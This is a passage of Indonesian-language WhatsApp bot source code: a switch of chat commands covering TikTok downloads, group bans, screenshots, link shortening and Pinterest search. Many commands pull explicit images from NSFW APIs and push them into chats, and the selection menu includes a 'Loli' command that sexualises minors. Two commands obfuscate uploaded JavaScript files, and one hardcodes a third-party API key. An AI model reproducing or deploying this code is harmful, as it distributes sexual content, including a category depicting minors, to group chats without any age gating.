//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tt": case "tiktok": {
if (!text) return ArroganzzReply(example("url"))
if (!text.startsWith("https://")) return ArroganzzReply(example("url"))
await tiktokDl(q).then(async (result) => {
if (!result.status) return ArroganzzReply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: XPanz.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await XPanz.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await XPanz.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'banchat': {
  if (!isOwner) return m.reply('❌ Khusus owner!');
  if (!m.isGroup) return m.reply('❌ Hanya bisa di grup!');
  if (!banchat.includes(m.chat)) {
    banchat.push(m.chat);
    fs.writeFileSync(banchatFile, JSON.stringify(banchat, null, 2));
    m.reply('✅ Grup ini telah *dibanned*. Semua command akan diabaikan.');
  } else {
    m.reply('⚠️ Grup ini sudah dibanned. Gunakan .unbanchat untuk membuka.');
  }
}
break

case 'unbanchat': {
  if (!isOwner) return m.reply('❌ Khusus owner!');
  if (!m.isGroup) return m.reply('❌ Hanya bisa di grup!');
  if (!banchat.includes(m.chat)) {
    m.reply('✅ Grup ini belum diban.');
  } else {
    banchat = banchat.filter(id => id !== m.chat);
    fs.writeFileSync(banchatFile, JSON.stringify(banchat, null, 2));
    m.reply('✅ Grup ini telah *di-unban*. Semua command kembali aktif.');
  }
}
break

case 'listbanchat': {
  if (!isOwner) return m.reply('❌ Khusus owner!');
  if (banchat.length === 0) return m.reply('✅ Tidak ada grup yang dibanned.');
  let teks = `📛 *Daftar Grup yang Dibanned:*\n\n`;
  for (let id of banchat) {
    teks += `• ${id}\n`;
  }
  m.reply(teks);
}
break

case "ssweb": {
if (!text) return ArroganzzReply(example("https://example.com"))
if (!isUrl(text)) return ArroganzzReply(example("https://example.com"))
var data = await fetchJson(`https://restapi-v2.simplebot.my.id/tools/ssweb?url=${text}`)
await XPanz.sendMessage(m.chat, { image: { url: data.result.iurl}, mimetype: "image/png"}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "hentai": {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
const { data } = await axios.get(`https://nekobot.xyz/api/image?type=hentai`);
if (!data.success || !data.message) {
return XPanz.sendMessage(m.chat, { text: "❌ Gagal mengambil gambar." }, { quoted: m });
}
XPanz.sendMessage(m.chat, {
image: { url: data.message }, 
thumbnailUrl: data.message,
renderLargerThumbnail: true,
caption: `Type: Hentai`,
footer: global.footer,
buttons: [
{
buttonId: `.hentai`,
buttonText: { displayText: "Lanjut || Hentai" }
}
],
viewOnce: true,
}, { quoted: m });
}
break

case "holo": {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
const { data } = await axios.get(`https://nekobot.xyz/api/image?type=holo`);
if (!data.success || !data.message) {
return XPanz.sendMessage(m.chat, { text: "❌ Gagal mengambil gambar." }, { quoted: m });
}
XPanz.sendMessage(m.chat, {
image: { url: data.message }, 
thumbnailUrl: data.message,
renderLargerThumbnail: true,
caption: `Type: Holo`,
footer: global.footer,
buttons: [
{
buttonId: `.holo`,
buttonText: { displayText: "Lanjut || Holo" }
}
],
viewOnce: true,
}, { quoted: m });
}
break

case "gonewild": {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
const { data } = await axios.get(`https://nekobot.xyz/api/image?type=gonewild`);
if (!data.success || !data.message) {
return XPanz.sendMessage(m.chat, { text: "❌ Gagal mengambil gambar." }, { quoted: m });
}
XPanz.sendMessage(m.chat, {
image: { url: data.message }, 
thumbnailUrl: data.message,
renderLargerThumbnail: true,
caption: `Type: Gonewild`,
footer: global.footer,
buttons: [
{
buttonId: `.gonewild`,
buttonText: { displayText: "Lanjut || Gonewild" }
}
],
viewOnce: true,
}, { quoted: m });
}
break

case "thigh": {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
const { data } = await axios.get(`https://nekobot.xyz/api/image?type=thigh`);
if (!data.success || !data.message) {
return XPanz.sendMessage(m.chat, { text: "❌ Gagal mengambil gambar." }, { quoted: m });
}
XPanz.sendMessage(m.chat, {
image: { url: data.message }, 
thumbnailUrl: data.message,
renderLargerThumbnail: true,
caption: `Type: Thigh`,
footer: global.footer,
buttons: [
{
buttonId: `.thigh`,
buttonText: { displayText: "Lanjut || Thigh" }
}
],
viewOnce: true,
}, { quoted: m });
}
break

case "paizuri": {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
const { data } = await axios.get(`https://nekobot.xyz/api/image?type=paizuri`);
if (!data.success || !data.message) {
return XPanz.sendMessage(m.chat, { text: "❌ Gagal mengambil gambar." }, { quoted: m });
}
XPanz.sendMessage(m.chat, {
image: { url: data.message }, 
thumbnailUrl: data.message,
renderLargerThumbnail: true,
caption: `Type: Paizuri`,
footer: global.footer,
buttons: [
{
buttonId: `.paizuri`,
buttonText: { displayText: "Lanjut || Paizuri" }
}
],
viewOnce: true,
}, { quoted: m });
}
break

case "hass": {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
const { data } = await axios.get(`https://nekobot.xyz/api/image?type=hass`);
if (!data.success || !data.message) {
return XPanz.sendMessage(m.chat, { text: "❌ Gagal mengambil gambar." }, { quoted: m });
}
XPanz.sendMessage(m.chat, {
image: { url: data.message }, 
thumbnailUrl: data.message,
renderLargerThumbnail: true,
caption: `Type: Hass`,
footer: global.footer,
buttons: [
{
buttonId: `.hass`,
buttonText: { displayText: "Lanjut || Hass" }
}
],
viewOnce: true,
}, { quoted: m });
}
break

case "hboobs": {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
const { data } = await axios.get(`https://nekobot.xyz/api/image?type=hboobs`);
if (!data.success || !data.message) {
return XPanz.sendMessage(m.chat, { text: "❌ Gagal mengambil gambar." }, { quoted: m });
}
XPanz.sendMessage(m.chat, {
image: { url: data.message }, 
thumbnailUrl: data.message,
renderLargerThumbnail: true,
caption: `Type: Hboobs`,
footer: global.footer,
buttons: [
{
buttonId: `.hboobs`,
buttonText: { displayText: "Lanjut || Hboobs" }
}
],
viewOnce: true,
}, { quoted: m });
}
break

case "hmidriff": {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
const { data } = await axios.get(`https://nekobot.xyz/api/image?type=hmidriff`);
if (!data.success || !data.message) {
return XPanz.sendMessage(m.chat, { text: "❌ Gagal mengambil gambar." }, { quoted: m });
}
XPanz.sendMessage(m.chat, {
image: { url: data.message }, 
thumbnailUrl: data.message,
renderLargerThumbnail: true,
caption: `Type: Hmidriff`,
footer: global.footer,
buttons: [
{
buttonId: `.hmidriff`,
buttonText: { displayText: "Lanjut || Hmidriff" }
}
],
viewOnce: true,
}, { quoted: m });
}
break

case "hneko": {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
const { data } = await axios.get(`https://nekobot.xyz/api/image?type=hneko`);
if (!data.success || !data.message) {
return XPanz.sendMessage(m.chat, { text: "❌ Gagal mengambil gambar." }, { quoted: m });
}
XPanz.sendMessage(m.chat, {
image: { url: data.message }, 
thumbnailUrl: data.message,
renderLargerThumbnail: true,
caption: `Type: Neko`,
footer: global.footer,
buttons: [
{
buttonId: `.neko`,
buttonText: { displayText: "Lanjut || Neko😋" }
}
],
viewOnce: true,
}, { quoted: m });
}
break

case "hkitsune": {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
const { data } = await axios.get(`https://nekobot.xyz/api/image?type=hkitsune`);
if (!data.success || !data.message) {
return XPanz.sendMessage(m.chat, { text: "❌ Gagal mengambil gambar." }, { quoted: m });
}
XPanz.sendMessage(m.chat, {
image: { url: data.message }, 
thumbnailUrl: data.message,
renderLargerThumbnail: true,
caption: `Type: Hkitsune`,
footer: global.footer,
buttons: [
{
buttonId: `.hkitsune`,
buttonText: { displayText: "Lanjut || Hkitsune" }
}
],
viewOnce: true,
}, { quoted: m });
}
break

case "hanal": {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
const { data } = await axios.get(`https://nekobot.xyz/api/image?type=hanal`);
if (!data.success || !data.message) {
return XPanz.sendMessage(m.chat, { text: "❌ Gagal mengambil gambar." }, { quoted: m });
}
XPanz.sendMessage(m.chat, {
image: { url: data.message }, 
thumbnailUrl: data.message,
renderLargerThumbnail: true,
caption: `Type: Hanal`,
footer: global.footer,
buttons: [
{
buttonId: `.hanal`,
buttonText: { displayText: "Lanjut || Hanal" }
}
],
viewOnce: true,
}, { quoted: m });
}
break

case "nsfw": {
return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Silahkan Pilih Nfsw',
          sections: [
            {
              title: 'List Nsfw',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Hentai', 
                  id: `.hentai`
                },
                {
                  title: 'Holo', 
                  id: `.holo`
                },
                {
                  title: 'Gonewild', 
                  id: `.gonewild`
                },
                {
                  title: 'Thigh', 
                  id: `.thigh`
                },
                {
                  title: 'Paizuri', 
                  id: `.paizuri`
                },      
                {
                  title: 'Boobs', 
                  id: `.hboobs`
                },      
                {
                  title: 'Neko', 
                  id: `.hneko`
                },      
                {
                  title: 'Kitsune', 
                  id: `.hkitsune`
                },      
                {
                  title: 'Anal', 
                  id: `.hanal`
                },      
                {
                  title: 'Nsfw ??', 
                  id: `.hmidriff`
                },      
                {
                  title: 'Cosplay', 
                  id: `.cosplay`
                },
                {
                  title: 'Ahegao', 
                  id: `.ahegao`
                },      
                {
                  title: 'Bdsm', 
                  id: `.bdsm`
                },      
                {
                  title: 'Loli', 
                  id: `.loli`
                },      
                {
                  title: 'Zetaai', 
                  id: `.zetai`
                },      
                {
                  title: 'Tentacle', 
                  id: `.tentacle`
                },      
                {
                  title: 'Gangbang', 
                  id: `.gangbang`
                },      
                {
                  title: 'Masturbasi', 
                  id: `.masturbasi`
                },
                {
                  title: 'Hentai Waifu', 
                  id: `.hw`
                },
                {
                  title: 'Hentai Trap', 
                  id: `.trap`
                },      
                {
                  title: 'Hentai Neko', 
                  id: `.hn`
                },      
                {
                  title: 'Hentai ??', 
                  id: `.hr`
                },      
                {
                  title: 'Hentai ??', 
                  id: `.hg`
                }                     
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Nfsw Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

case "hg": {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;

        const { data } = await axios.get('https://gelbooru.com/index.php?page=dapi&s=post&q=index&json=1&limit=100&tags=rating:explicit');

        if (!data || !data.post || data.post.length === 0) {
            return XPanz.sendMessage(m.chat, { text: "❌ Gagal mengambil gambar." }, { quoted: m });
        }

        // Pilih gambar secara random dari hasil API
        const randomImage = data.post[Math.floor(Math.random() * data.post.length)].file_url;

        XPanz.sendMessage(m.chat, {
            image: { url: randomImage }, 
            thumbnailUrl: randomImage,
            renderLargerThumbnail: true,
            caption: Pepek,
            footer: global.footer,
            buttons: [
                {
                    buttonId: `.hg`,
                    buttonText: { displayText: "Lanjut || Waifu" }
                }
            ],
            viewOnce: true,
        }, { quoted: m });
}
break

case "hr": {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;

        const { data } = await axios.get('https://danbooru.donmai.us/posts.json?tags=rating:explicit&limit=100');

        if (!data || data.length === 0) {
            return XPanz.sendMessage(m.chat, { text: "❌ Gagal mengambil gambar." }, { quoted: m });
        }

        // Pilih gambar secara random dari hasil API
        const randomImage = data[Math.floor(Math.random() * data.length)].file_url;

        XPanz.sendMessage(m.chat, {
            image: { url: randomImage }, 
            thumbnailUrl: randomImage,
            renderLargerThumbnail: true,
            caption: Pepek,
            footer: global.footer,
            buttons: [
                {
                    buttonId: `.hr`,
                    buttonText: { displayText: "Lanjut || Waifu" }
                }
            ],
            viewOnce: true,
        }, { quoted: m });
}
break

case 'hw': {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
const { data } = await axios.get('https://api.waifu.pics/nsfw/waifu');
XPanz.sendMessage(m.chat, {
image: { url: data.url }, 
thumbnailUrl: data.url,
renderLargerThumbnail: true,
caption: Pepek,
footer: global.footer,
buttons: [
{
buttonId: `.hw`,
buttonText: {
displayText: "Lanjut || Waifu"
}
}
],
viewOnce: true,
}, { quoted: m });
}
break

case 'hn': {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
const { data } = await axios.get('https://api.waifu.pics/nsfw/neko');
XPanz.sendMessage(m.chat, {
image: { url: data.url }, 
thumbnailUrl: data.url,
renderLargerThumbnail: true,
caption: Pepek,
footer: global.footer,
buttons: [
{
buttonId: `.hn`,
buttonText: {
displayText: "Lanjut || Waifu"
}
}
],
viewOnce: true,
}, { quoted: m });
}
break

case 'waifu': {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
const { data } = await axios.get('https://api.waifu.pics/sfw/waifu');
XPanz.sendMessage(m.chat, {
image: { url: data.url }, 
thumbnailUrl: data.url,
renderLargerThumbnail: true,
caption: Pepek,
footer: global.footer,
buttons: [
{
buttonId: `.waifu`,
buttonText: {
displayText: "Lanjut || Waifu"
}
}
],
viewOnce: true,
}, { quoted: m });
}
break

case 'neko': {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
const { data } = await axios.get('https://api.waifu.pics/sfw/neko');
XPanz.sendMessage(m.chat, {
image: { url: data.url }, 
thumbnailUrl: data.url,
renderLargerThumbnail: true,
caption: Pepek,
footer: global.footer,
buttons: [
{
buttonId: `.neko`,
buttonText: {
displayText: "Lanjut || Neko"
}
}
],
viewOnce: true,
}, { quoted: m });
}
break



case "enc": case "encrypt": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!m.quoted) return ArroganzzReply(example("dengan reply file .js"))
if (mime !== "application/javascript" && mime !== "text/javascript") return ArroganzzReply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./database/sampah/${filename}`, media)
await ArroganzzReply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./database/sampah/${filename}`).toString(), {
  target: "node",
  preset: "high",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.75,
  deadCode: 0.2,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  identifierGenerator: "randomized",
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: { hash: 0.5, true: 0.5 },
  stack: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  rgf: false
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./database/sampah/${filename}`, obfuscated)
  await XPanz.sendMessage(m.chat, {document: fs.readFileSync(`./database/sampah/${filename}`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt file sukses ✅"}, {quoted: m})
}).catch(e => ArroganzzReply("Error :" + e))
  await fs.unlinkSync(`./database/sampah/${filename}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "enchard": case "encrypthard": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!m.quoted) return ArroganzzReply("Reply file .js")
if (mime !== "application/javascript" && mime !== "text/javascript") return ArroganzzReply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await ArroganzzReply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "/*Skyzopedia/*^/*($break)*/" + 
            "/*Skyzopedia/*^/*($break)*/";

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },

    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await XPanz.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => ArroganzzReply("Error :" + e))
await fs.unlinkSync(`./@hardenc${filename}.js`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink": case "shorturl": {
if (!text) return ArroganzzReply(example("https://example.com"))
if (!isUrl(text)) return ArroganzzReply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return ArroganzzReply(link)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink-dl": {
if (!text) return ArroganzzReply(example("https://example.com"))
if (!isUrl(text)) return ArroganzzReply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await XPanz.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "idgc": case "cekidgc": {
if (!m.isGroup) return ArroganzzReply(mess.group)
ArroganzzReply(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = ` *── List all group chat*\n`
let a = await XPanz.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return ArroganzzReply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'idch': case 'cekidch': {
if (!text) return m.reply(example("linkchnya mana"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await XPanz.newsletterMetadata("invite", result)
let teks = `* *ID : ${res.id}*
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: teks }, 
footer: {
text: wm }, 
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
           },
     ], },},
    }, }, },{ quoted : m });
await XPanz.relayMessage( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'pin':
case 'pinterest': {
 if (!text) return ArroganzzReply(`Format salah, contoh: \n${prefix + command} Anime`)
 
 let anutrest = await pinterest(text) // Ambil hasil pencarian
 if (!anutrest || anutrest.length === 0) return ArroganzzReply("Error, Foto Tidak Ditemukan")

 // Ambil maksimal 10 gambar biar nggak terlalu panjang
 let selectedImages = anutrest.slice(0, 5);
 let anu = []

 for (let i = 0; i < selectedImages.length; i++) {
 let imgsc = await prepareWAMessageMedia(
 { image: { url: selectedImages[i].image } }, 
 { upload: XPanz.waUploadToServer }
 )

 anu.push({
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `Gambar ke *${i + 1}*`, 
 hasMediaAttachment: true,
 ...imgsc
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [{
 name: "cta_url",
 buttonParamsJson: JSON.stringify({
 display_text: "Lihat di Pinterest",
 url: selectedImages[i].source || selectedImages[i].image
 })
 }]
 }), 
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: "© Arroganzz - Botz"
 })
 })
 }

 // Buat format `carouselMessage`
 const msg = await generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `🔎 Berikut hasil pencarian gambar untuk *${text}*`
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: anu
 })
 })
 }
 }
 }, {
 userJid: m.sender,
 quoted: m
 })

 XPanz.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}
break

case 'cosplay': {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
XPanz.sendMessage(m.chat, {
image: { url: NsfwCosplay }, 
thumbnailUrl: NsfwCosplay,
renderLargerThumbnail: true,
caption: Pepek,
footer: global.footer,
buttons: [
{
buttonId: `.cosplay`,
buttonText: {
displayText: "Lanjut || Cosplay"
}
}
],
viewOnce: true,
}, { quoted: m });
}
break

case 'ahegao': {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
XPanz.sendMessage(m.chat, {
image: { url: NsfwAhegao }, 
thumbnailUrl: NsfwAhegao,
renderLargerThumbnail: true,
caption: Pepek,
footer: global.footer,
buttons: [
{
buttonId: `.ahegao`,
buttonText: {
displayText: "Lanjut || Ahegao"
}
}
],
viewOnce: true,
}, { quoted: m });
}
break

case 'bdsm': {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
XPanz.sendMessage(m.chat, {
image: { url: NsfwBdsm }, 
thumbnailUrl: NsfwBdsm,
renderLargerThumbnail: true,
caption: Pepek,
footer: global.footer,
buttons: [
{
buttonId: `.bdsm`,
buttonText: {
displayText: "Lanjut || Bdsm"
}
}
],
viewOnce: true,
}, { quoted: m });
}
break

case 'zetai': {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
XPanz.sendMessage(m.chat, {
image: { url: NsfwZetai }, 
thumbnailUrl: NsfwZetai,
renderLargerThumbnail: true,
caption: Pepek,
footer: global.footer,
buttons: [
{
buttonId: `.zetai`,
buttonText: {
displayText: "Lanjut || Zettai"
}
}
],
viewOnce: true,
}, { quoted: m });
}
break

case 'loli': {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
XPanz.sendMessage(m.chat, {
image: { url: NsfwLoli }, 
thumbnailUrl: NsfwLoli,
renderLargerThumbnail: true,
caption: Pepek,
footer: global.footer,
buttons: [
{
buttonId: `.loli`,
buttonText: {
displayText: "Lanjut || Loli"
}
}
],
viewOnce: true,
}, { quoted: m });
}
break

case 'masturbasi': {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
XPanz.sendMessage(m.chat, {
image: { url: NsfwMasturbasi }, 
thumbnailUrl: NsfwMasturbasi,
renderLargerThumbnail: true,
caption: Pepek,
footer: global.footer,
buttons: [
{
buttonId: `.masturbasi`,
buttonText: {
displayText: "Lanjut || Masturbasi"
}
}
],
viewOnce: true,
}, { quoted: m });
}
break

case 'tentacle': {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
XPanz.sendMessage(m.chat, {
image: { url: NsfwTentacle }, 
thumbnailUrl: NsfwTentacle,
renderLargerThumbnail: true,
caption: Pepek,
footer: global.footer,
buttons: [
{
buttonId: `.tentacle`,
buttonText: {
displayText: "Lanjut || Tentacle"
}
}
],
viewOnce: true,
}, { quoted: m });
}
break

case 'gangbang': {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
XPanz.sendMessage(m.chat, {
image: { url: NsfwGangbang }, 
thumbnailUrl: NsfwGangbang,
renderLargerThumbnail: true,
caption: Pepek,
footer: global.footer,
buttons: [
{
buttonId: `.gangbang`,
buttonText: {
displayText: "Lanjut || Gangbang"
}
}
],
viewOnce: true,
}, { quoted: m });
}
break

case 'nass': {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
XPanz.sendMessage(m.chat, {
image: { url: NsfwAss }, 
thumbnailUrl: NsfwAss,
renderLargerThumbnail: true,
caption: Pepek,
footer: global.footer,
buttons: [
{
buttonId: `.nass`,
buttonText: {
displayText: "Lanjut || Nass"
}
}
],
viewOnce: true,
}, { quoted: m });
}
break

case 'ero': {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
XPanz.sendMessage(m.chat, {
image: { url: NsfwEro }, 
thumbnailUrl: NsfwEro,
renderLargerThumbnail: true,
caption: Pepek,
footer: global.footer,
buttons: [
{
buttonId: `.ero`,
buttonText: {
displayText: "Lanjut || Ero"
}
}
],
viewOnce: true,
}, { quoted: m });
}
break

case "tulisanime":
 if (!text) return ArroganzzReply(mess.query);

ArroganzzReply(mess.wait);

 try {
 const imageUrl = "https://files.catbox.moe/wftnwc.jpg";
 const imagePath = path.join(__dirname, "gambar_anime.jpg");

 const response = await axios({ url: imageUrl, responseType: "arraybuffer" });
 fs.writeFileSync(imagePath, Buffer.from(response.data, "binary"));

 const image = await Jimp.read(imagePath);
 const font = await Jimp.loadFont(Jimp.FONT_SANS_32_BLACK);

 const x = 243, y = 750, maxWidth = 600;
 image.print(font, x, y, { text, alignmentX: Jimp.HORIZONTAL_ALIGN_CENTER, alignmentY: Jimp.VERTICAL_ALIGN_MIDDLE }, maxWidth);

 const outputPath = path.join(__dirname, "hasil.png");
 await image.writeAsync(outputPath);

 XPanz.sendMessage(m.sender, { image: fs.readFileSync(outputPath), caption: "Ini hasilnya!" }, { quoted: m });

 fs.unlinkSync(imagePath);
 fs.unlinkSync(outputPath);
 } catch (e) {
 console.error(e);
 return e;
 }
 break

case "logogen": {
 if (!text) {
 return ArroganzzReply("Masukkan judul, ide, dan slogan logo. Format: .logogen Judul,Ide,Slogan");
 }

 const [title, idea, slogan] = text.split(",");

 if (!title || !idea || !slogan) {
 return ArroganzzReply("Format salah. Gunakan : .logogen Judul,Ide,Slogan\n\n*Example :* .logogen Takashi,imul Impul,Jangan lupa Follow yah");
 }

 try {
 const payload = {
 ai_icon: [333276, 333279],
 height: 300,
 idea: idea,
 industry_index: "N",
 industry_index_id: "",
 pagesize: 4,
 session_id: "",
 slogan: slogan,
 title: title,
 whiteEdge: 80,
 width: 400
 };

 const { data } = await axios.post("https://www.sologo.ai/v1/api/logo/logo_generate", payload);
 
 if (!data.data.logoList || data.data.logoList.length === 0) {
 return ArroganzzReply("Gagal Membuat Logo");
 }

 const logoUrls = data.data.logoList.map(logo => logo.logo_thumb);
 
 for (const url of logoUrls) {
 await XPanz.sendMessage(m.chat, { image: { url: url } });
 }
 } catch (error) {
 console.error("Error generating logo:", error);
 await ArroganzzReply("Failed to Create Logo");
 }
}
break

case 'trap': {
let Pepek = `Pilih Tombol Untuk Melanjutkan`;
const { data } = await axios.get('https://api.waifu.pics/nsfw/trap');
XPanz.sendMessage(m.chat, {
image: { url: data.url }, 
thumbnailUrl: data.url,
renderLargerThumbnail: true,
caption: Pepek,
footer: global.footer,
buttons: [
{
buttonId: `.trap`,
buttonText: {
displayText: "Lanjut || Hentai"
}
}
],
viewOnce: true,
}, { quoted: m });
}
break

case "shutdown": {
if (!isCreator) return ArroganzzReply(mess.owner)
ArroganzzReply(`Shutdown Bot...`)
await sleep(5000)
process.exit()
}
break

case "reactch": {
 if (!isOwner) return m.reply(msg.owner)
